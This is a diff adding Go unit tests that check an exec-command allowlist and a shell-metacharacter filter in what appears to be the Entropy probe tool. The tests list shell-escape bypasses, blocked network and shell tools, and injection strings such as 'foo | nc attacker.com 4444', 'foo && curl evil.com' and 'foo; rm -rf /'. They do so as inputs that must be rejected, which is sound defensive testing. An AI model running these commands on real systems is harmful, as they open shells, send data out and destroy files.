@@ -161,3 +161,145 @@ func TestTCPProbe_SSRFBlocked(t *testing.T) {
 		t.Error("Expected SSRF protection to block metadata host")
 	}
 }
+
+// TestValidateExecCommand_AllowsDefaultCommands verifies the read-only
+// diagnostic commands in the default allowlist are permitted.
+func TestValidateExecCommand_AllowsDefaultCommands(t *testing.T) {
+	allowed := []string{"cat", "ls", "stat", "test", "true", "false", "echo", "pgrep", "ps", "head", "tail", "wc", "grep"}
+	for _, cmd := range allowed {
+		t.Run(cmd, func(t *testing.T) {
+			if err := validateExecCommand([]string{cmd, "arg1"}); err != nil {
+				t.Errorf("expected %q to be allowed, got error: %v", cmd, err)
+			}
+		})
+	}
+}
+
+// TestValidateExecCommand_AllowsAbsolutePath verifies the allowlist check
+// works against the base name even when an absolute path is supplied.
+func TestValidateExecCommand_AllowsAbsolutePath(t *testing.T) {
+	if err := validateExecCommand([]string{"/bin/cat", "/etc/hostname"}); err != nil {
+		t.Errorf("expected /bin/cat to be allowed, got error: %v", err)
+	}
+}
+
+// TestValidateExecCommand_RejectsBypassVectors verifies that commands which
+// were NOT on the old blocklist, but which can still be abused to obtain
+// shell/code execution, are rejected by the new allowlist model. These are
+// exactly the class of bypass a blocklist cannot close.
+func TestValidateExecCommand_RejectsBypassVectors(t *testing.T) {
+	bypasses := [][]string{
+		{"env", "sh", "-c", "id"},
+		{"busybox", "sh"},
+		{"awk", "BEGIN{system(\"id\")}"},
+		{"find", ".", "-exec", "id", ";"},
+		{"xargs", "id"},
+		{"vi", "-c", ":!id"},
+	}
+	for _, cmd := range bypasses {
+		t.Run(cmd[0], func(t *testing.T) {
+			if err := validateExecCommand(cmd); err == nil {
+				t.Errorf("expected %v to be rejected, got no error", cmd)
+			}
+		})
+	}
+}
+
+// TestValidateExecCommand_StillBlocksLegacyBlockedCommands verifies commands
+// that were explicitly blocked before (shells, interpreters, network tools)
+// remain rejected under the new allowlist model.
+func TestValidateExecCommand_StillBlocksLegacyBlockedCommands(t *testing.T) {
+	legacy := []string{"sh", "bash", "curl", "wget", "nc", "python3", "rm", "ssh"}
+	for _, cmd := range legacy {
+		t.Run(cmd, func(t *testing.T) {
+			if err := validateExecCommand([]string{cmd}); err == nil {
+				t.Errorf("expected %q to be rejected, got no error", cmd)
+			}
+		})
+	}
+}
+
+// TestValidateExecCommand_RejectsShellMetacharacters verifies the
+// defense-in-depth argument scan blocks shell metacharacters even on an
+// allowlisted executable.
+func TestValidateExecCommand_RejectsShellMetacharacters(t *testing.T) {
+	dangerous := []string{
+		"foo; rm -rf /",
+		"foo | nc attacker.com 4444",
+		"foo && curl evil.com",
+		"$(id)",
+		"`id`",
+		"foo > /etc/passwd",
+	}
+	for _, arg := range dangerous {
+		t.Run(arg, func(t *testing.T) {
+			if err := validateExecCommand([]string{"cat", arg}); err == nil {
+				t.Errorf("expected argument %q to be rejected, got no error", arg)
+			}
+		})
+	}
+}
+
+// TestValidateExecCommand_EmptyCommand verifies an empty command is rejected.
+func TestValidateExecCommand_EmptyCommand(t *testing.T) {
+	if err := validateExecCommand(nil); err == nil {
+		t.Error("expected empty command to be rejected")
+	}
+}
+
+// TestValidateExecCommand_EnvAllowlistExtension verifies ENTROPY_EXEC_ALLOWLIST
+// lets operators extend the allowlist without forking Entropy.
+func TestValidateExecCommand_EnvAllowlistExtension(t *testing.T) {
+	if err := validateExecCommand([]string{"whoami"}); err == nil {
+		t.Fatal("expected 'whoami' to be rejected by default, got no error")
+	}
+
+	t.Setenv("ENTROPY_EXEC_ALLOWLIST", "whoami, id")
+
+	if err := validateExecCommand([]string{"whoami"}); err != nil {
+		t.Errorf("expected 'whoami' to be allowed via ENTROPY_EXEC_ALLOWLIST, got error: %v", err)
+	}
+	if err := validateExecCommand([]string{"id"}); err != nil {
+		t.Errorf("expected 'id' to be allowed via ENTROPY_EXEC_ALLOWLIST, got error: %v", err)
+	}
+	if err := validateExecCommand([]string{"curl"}); err == nil {
+		t.Error("expected 'curl' to remain rejected even with ENTROPY_EXEC_ALLOWLIST set for other commands")
+	}
+}
+
+// TestRunExecProbe_BlocksDisallowedCommand verifies the end-to-end exec probe
+// path rejects a disallowed command before ever calling the runtime.
+func TestRunExecProbe_BlocksDisallowedCommand(t *testing.T) {
+	mock := NewMockRuntime()
+	probe := &config.ProbeSpec{
+		Type:    "exec",
+		Target:  "service-a",
+		Command: "env sh -c id",
+	}
+	result := RunProbe(probe, mock)
+	if result.Success {
+		t.Error("expected exec probe with disallowed command to fail")
+	}
+	if mock.CallCount("ExecCommand") != 0 {
+		t.Error("expected ExecCommand to never be called for a disallowed command")
+	}
+}
+
+// TestRunExecProbe_AllowsSafeCommand verifies the end-to-end exec probe path
+// executes an allowlisted command normally.
+func TestRunExecProbe_AllowsSafeCommand(t *testing.T) {
+	mock := NewMockRuntime()
+	mock.ExecExit = 0
+	probe := &config.ProbeSpec{
+		Type:    "exec",
+		Target:  "service-a",
+		Command: "cat /etc/hostname",
+	}
+	result := RunProbe(probe, mock)
+	if !result.Success {
+		t.Errorf("expected allowlisted exec probe to succeed, got: %s", result.Message)
+	}
+	if mock.CallCount("ExecCommand") != 1 {
+		t.Errorf("expected ExecCommand to be called once, got %d", mock.CallCount("ExecCommand"))
+	}
+}
